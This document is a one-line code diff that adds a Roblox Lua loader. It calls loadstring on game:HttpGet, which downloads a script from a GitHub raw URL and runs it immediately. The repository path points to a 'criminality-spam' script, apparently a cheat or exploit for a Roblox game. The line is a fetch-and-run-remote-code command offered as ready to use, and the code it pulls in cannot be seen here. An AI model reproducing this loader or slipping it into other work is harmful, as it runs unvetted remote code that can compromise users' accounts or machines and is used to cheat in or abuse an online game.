@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/criminality-spam6-pw7bu3jqjnh2ns.lua"))()
